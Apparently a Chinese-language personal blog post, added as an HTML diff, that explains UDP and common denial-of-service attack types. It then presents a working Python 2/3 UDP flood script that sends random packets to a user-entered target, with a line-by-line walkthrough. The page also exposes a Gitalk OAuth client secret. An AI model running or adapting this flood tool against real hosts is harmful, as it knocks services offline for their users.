@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="一介凡人做的平凡的隨筆部落格..." />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    用Python編譯簡單UDP DoS工具 |  Noir Espace
+  </title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-用Python編譯簡單UDP DoS工具" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  用Python編譯簡單UDP DoS工具
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2019/10/28/%E7%94%A8Python%E7%B7%A8%E8%AD%AF%E7%B0%A1%E5%96%AEUDP%20DoS%E5%B7%A5%E5%85%B7/" class="article-date">
+  <time datetime="2019-10-28T12:50:00.000Z" itemprop="datePublished">2019-10-28</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Cyber-Security/">Cyber Security</a> / <a class="article-category-link" href="/categories/Cyber-Security/Tool/">Tool</a> / <a class="article-category-link" href="/categories/Python/">Python</a>
+  </div>
+
+      
+      
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字數統計:</span>
+            <span class="post-count">1.7k字</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 閱讀時長≈</span>
+            <span class="post-count">6分鐘</span>
+        </span>
+    </span>
+</div>
+
+
+      
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <blockquote>
+<p>Reference: <a href="https://www.youtube.com/watch?v=n2XZeofp41E" target="_blank" rel="noopener">用python編譯簡單的dos工具</a></p>
+</blockquote>
+<hr>
+<h2 id="UDP-DoS-Attack"><a class="header-anchor" href="#UDP-DoS-Attack"></a><strong>UDP? DoS Attack?</strong></h2>
+<h3 id="What-is-UDP"><a class="header-anchor" href="#What-is-UDP"></a><em>What is UDP?</em></h3>
+<ul>
+<li>UDP，User Datagram Protocal，主要位在OSI傳輸層</li>
+<li>在TCP/IP模型中在網路層上、應用層下提供簡單的介面，只提供資料的不可靠傳遞</li>
+<li>因缺乏可靠性，且屬於無連接協定 =&gt; 應用程式必須容許一些<strong>遺失</strong>、<strong>錯誤</strong>、<strong>重複</strong>的封包</li>
+<li>有些應用程式不大需要可靠性機制，甚至可能因為引入可靠性而降低效能，故而使用此類協定
+<ul>
+<li>e.g. 串流媒體、即時多人遊戲、IP語音</li>
+</ul>
+</li>
+<li>因為UDP傳送端無法檢測壅塞，所以像使用queue、丟棄技術路由器之類的網路基礎裝置會用於降低UDP過大流量
+<ul>
+<li>DCCP(資料壅塞控制協定) =&gt; 通過在諸如串流媒體類型的高速UDP流中增加主機壅塞控制，來減小此潛在問題</li>
+</ul>
+</li>
+<li>主要應用：
+<ul>
+<li>DNS (Domain Name Server)</li>
+<li>DHCP (Dynamic Host Configuration Protocol)</li>
+<li>SNMP (Simple Network Management Protocol)</li>
+<li>RIP (Router Information Protocol)</li>
+</ul>
+</li>
+</ul>
+<a id="more"></a>
+<h3 id="What-is-DoS-Attack"><a class="header-anchor" href="#What-is-DoS-Attack"></a><em>What is DoS Attack?</em></h3>
+<blockquote>
+<p>Reference: <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank" rel="noopener">Denial-of-service attack</a></p>
+</blockquote>
+<ul>
+<li>DoS Attack，Denial-of-Service Attack，中譯為阻斷服務攻擊，或稱洪水攻擊
+<ul>
+<li>目的：使目標電腦的網路 / 系統資源耗盡，使服務暫時中斷或停止，導致正常用戶無法存取</li>
+<li>當駭客使用<strong>兩個以上</strong>被攻陷並控制的電腦作為「殭屍(Bot)」向特定目標發動DoS攻擊，此類稱為「DDoS Attack(distibuted denial-of-service attack，分散式阻斷服務攻擊)</li>
+</ul>
+</li>
+<li>DoS Attack症狀包括：
+<ul>
+<li>網路異常緩慢</li>
+<li>特定網站無法存取</li>
+<li>無法存取任何網站</li>
+<li>垃圾郵件數量遽增</li>
+<li>無線或有線網路連線異常斷線</li>
+<li>長時間嘗試存取網站或任何網際網路服務被拒絕</li>
+<li>伺服器易斷線、卡頓</li>
+</ul>
+</li>
+<li>DoS Attack可能會導致區網內其他電腦一併被攻擊，其頻寬會因攻擊而大量消耗，進而引響其他電腦</li>
+</ul>
+<h4 id="攻擊方式"><a class="header-anchor" href="#攻擊方式"></a><mark>攻擊方式</mark></h4>
+<ul>
+<li>頻寬消耗型
+<ul>
+<li>可分為兩個不同的層次：洪泛攻擊、放大攻擊
+<ul>
+<li>洪泛攻擊
+<ul>
+<li>特點：利用殭屍程式傳送大量流量至受損的受礙者系統</li>
+<li>目的：堵塞其頻寬</li>
+</ul>
+</li>
+<li>放大攻擊
+<ul>
+<li>類似上面攻擊，通過惡意放大流量限制受害者系統的頻寬</li>
+<li>特點：
+<ul>
+<li>利用殭屍程式通過偽造的源IP(攻擊目標IP)向某些存在漏洞的伺服器傳送請求，伺服器在處理請求後向源IP傳送應答</li>
+<li>這些服務的特殊性導致response比request更長，使用頻寬就能使Server傳送大量response到目標主機</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><u>UDP floods (User Datagram Protocol floods)</u>
+<ul>
+<li>封包通過UDP傳送時不需要進行握手驗證</li>
+<li>大量UDP封包傳送給受害系統，可能會導致頻寬飽和</li>
+<li>UDP封包的目的埠可能是隨機或指定的埠號</li>
+<li>有時會影響受害系統周遭的網路連接，但取決於網路體系結構和網速</li>
+</ul>
+</li>
+<li><u>ICMP floods</u>
+<ul>
+<li>通過向未良好設定的路由器傳送廣播資訊，占用系統資源的做法</li>
+</ul>
+</li>
+<li><u>ping of death</u>
+<ul>
+<li>產生超過IP協定能容忍的封包數，若系統沒有檢查機制就會當機</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>資源消耗型
+<ul>
+<li><u>SYN floods</u>
+<ul>
+<li>全名為「傳送控制協定同步攻擊(TCP SYN attack)」，TCP包括在傳送者、接收者間在封包傳送前建立的完全訊號交換</li>
+<li>啟動系統傳送一個SYN請求，通常會回傳帶有自己SYN請求的ACK(確認)</li>
+<li>但若接收系統傳送SYN封包卻沒接收到ACK，則一段時間後會再傳送新的SYN封包，接收系統中的處理器、記憶體資源將儲存該TCP SYN請求直到超時</li>
+</ul>
+</li>
+<li><u>LAND attack</u>
+<ul>
+<li>類似SYN floods，但源IP跟目標IP都是攻擊物件的IP</li>
+<li>導致被攻擊的機器無窮迴圈</li>
+</ul>
+</li>
+<li><u>CC attack (Distributed HTTP flood)</u>
+<ul>
+<li>DDoS Attack的一種，使用代理伺服器向目標伺服器傳送大量貌似合法的請求(HTTP GET)</li>
+<li>CC(Challenge Collapsar)跟局其工具命名
+<ul>
+<li>利用眾多廣泛可用的免費代理伺服器發動DDoS Attack</li>
+<li>大多免費代理伺服器支援匿名，難以追蹤</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><u>Botnet attack</u>
+<ul>
+<li>Botnet =&gt; 大量被C&amp;C(Command and Control) Server所控制的網際網路主機群</li>
+<li>Botnet只有在執行特定指令時才會與伺服器進行通訊，根據網路通訊協定不同分為IRC、HTTP、P2P類等</li>
+</ul>
+</li>
+<li><u>Application level floods</u>
+<ul>
+<li>針對應用軟體層 (高於OSI)</li>
+<li>同樣以大量消耗系統資源為目的，通過向類似IIS的網路服務程式提出無節制的資源申請來迫害正常的網路服務</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="Code"><a class="header-anchor" href="#Code"></a><strong>Code</strong></h2>
+<ul>
+<li>Python2  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">bytes = random._urandom(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"This is a simple tool for UDP DoS."</span>)</span><br><span class="line"></span><br><span class="line">ip = raw_input(<span class="string">"Target ip or url: "</span>)</span><br><span class="line">port = input(<span class="string">"Port: "</span>)</span><br><span class="line">dur = input(<span class="string">"Time: "</span>)</span><br><span class="line"></span><br><span class="line">timeout = time.time() + dur</span><br><span class="line">sent = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> time.time() &gt; timeout:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        sock.sendto(bytes, (ip, port))</span><br><span class="line">        sent += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"Sent %s packets to %s"</span> % (sent, ip))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+</li>
+<li>Python3  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">bytes = random._urandom(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">"This is a simple tool for udp dos."</span>)</span><br><span class="line"></span><br><span class="line">ip = input(<span class="string">"Target ip or url: "</span>)</span><br><span class="line">port = int(input(<span class="string">"Port: "</span>))</span><br><span class="line">dur = int(input(<span class="string">"Time: "</span>))</span><br><span class="line"></span><br><span class="line">timeout = time.time() + dur</span><br><span class="line">sent = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> time.time() &gt; timeout:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        sock.sendto(bytes, (ip, port))</span><br><span class="line">        sent += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"Sent %s packets to %s"</span> % (sent, ip))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<h2 id="Code-Details"><a class="header-anchor" href="#Code-Details"></a><strong>Code Details</strong></h2>
+<blockquote>
+<p>以下以Python3版本做解釋</p>
+</blockquote>
+<ul>
+<li>
+<p>程式流程大概如下：</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">st&#x3D;&gt;start: Start</span><br><span class="line">e&#x3D;&gt;end: End</span><br><span class="line">sock&#x3D;&gt;operation: set socket</span><br><span class="line">input&#x3D;&gt;operation: input</span><br><span class="line">time_set&#x3D;&gt;operation: set timeout</span><br><span class="line">time_cond&#x3D;&gt;condition: timeout or not?</span><br><span class="line">dos&#x3D;&gt;operation: send packet</span><br><span class="line"></span><br><span class="line">st-&gt;sock-&gt;input-&gt;time_set-&gt;time_cond</span><br><span class="line">time_cond(yes)-&gt;e</span><br><span class="line">time_cond(no)-&gt;dos-&gt;time_cond</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>首先將所需的套件都先引入</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># simple_udp_dos.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>接著設定socket，並且設定封包大小</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># simple_udp_dos.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">bytes = random._urandom(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">"This is a simple tool for UDP DoS."</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>socket的幾個引數</p>
+<ul>
+<li>
+<p>IP位址引數</p>
+<table>
+<thead>
+<tr>
+<th>引數</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>socket.AF_INET</td>
+<td>IPv4 (default)</td>
+</tr>
+<tr>
+<td>socket.AF_INET6</td>
+<td>IPv6</td>
+</tr>
+</tbody>
+</table>
+</li>
+<li>
+<p>型別引數</p>
+<table>
+<thead>
+<tr>
+<th>引數</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>socket.SOCK_STREAM</td>
+<td>TCP (default)</td>
+</tr>
+<tr>
+<td>socket.SOCK_DGRAM</td>
+<td>UDP</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+</li>
+<li>
+<p><code>random._urandom()</code>，相當於<code>os.urandom()</code></p>
+<ul>
+<li>用來隨機存取OS中的資料作為欲傳送的資料</li>
+<li>根據網速可以設定bytes在1024的倍數上</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>輸入目標IP以及預計實施攻擊的時長</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># simple_udp_dos.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">ip = input(<span class="string">"Target ip or url: "</span>)</span><br><span class="line">port = int(input(<span class="string">"Port: "</span>))</span><br><span class="line">dur = int(input(<span class="string">"Time: "</span>))</span><br></pre></td></tr></table></figure>
+<ul>
+<li>接著繼續將timeout的時間做計算</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># simple_udp_dos.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">timeout = time.time() + dur</span><br><span class="line">sent = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>sent</code> =&gt; 計算已送出的封包數量</p>
+</blockquote>
+</li>
+<li>
+<p>實際進行DoS</p>
+<ul>
+<li>確認沒有超過攻擊時長，然後送封包到目標IP</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># simple_udp_dos.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> time.time() &gt; timeout:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        sock.sendto(bytes, (ip, port))</span><br><span class="line">        sent += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"Sent %s packets to %s"</span> % (sent, ip))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>sock.sendto(bytes, address)</code> =&gt; 將轉為bytes的資料傳送至目標IP</li>
+</ul>
+</li>
+</ul>
+
+      
+      <!-- 打賞 -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://nightcatv.github.io/2019/10/28/%E7%94%A8Python%E7%B7%A8%E8%AD%AF%E7%B0%A1%E5%96%AEUDP%20DoS%E5%B7%A5%E5%85%B7/" data-id="ck5plbl95000gx8ac8efhe34w"
+        class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cyber-security-tool/" rel="tag">cyber security - tool</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dos/" rel="tag">dos</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/udp/" rel="tag">udp</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/10/07/Data%20Structures%20in%20JavaScript:%20Objects%20and%20Arrays/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Data Structures in JavaScript: Objects and Arrays</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+
+  
+  
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '10625ff957aef51a06bf',
+    clientSecret: '314e364248568028064347a4a7df418bb734433f',
+    repo: 'nightcatv.github.io',
+    owner: 'nightcatv',
+    admin: ['nightcatv'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+
+  
+
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2020
+        NIghT cAt
+      </li>
+      <li>
+        
+          Powered by
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <ul class="list-inline">
+  <li>訪客數：<span id="busuanzi_value_page_pv"></span> 人</li>
+  <span> | </span>
+  <li>總訪問次數：<span id="busuanzi_value_site_uv"></span> 次</li>
+</ul>
+
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+    
+    <aside class="sidebar">
+      
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Noir Espace"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">首頁</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">目錄</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分類</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">標籤</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">關於我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜尋">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+			onClick: (e) => {
+      	document.getElementById(e.target.innerText).scrollIntoView()
+      	return false;
+    	}
+    });
+  </script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+  <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  
+  
+
+  </div>
+</body>
+
+</html>
